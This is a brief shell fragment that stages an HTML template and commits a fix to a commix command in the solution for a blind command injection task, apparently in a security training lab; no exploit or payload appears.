git add app/categories/a03_injection/templates/a03_injection/generate_report.html
git commit -m "fix: correct commix invocation in Blind Command Injection Task 3 solution to the command verified working against the real container"
```
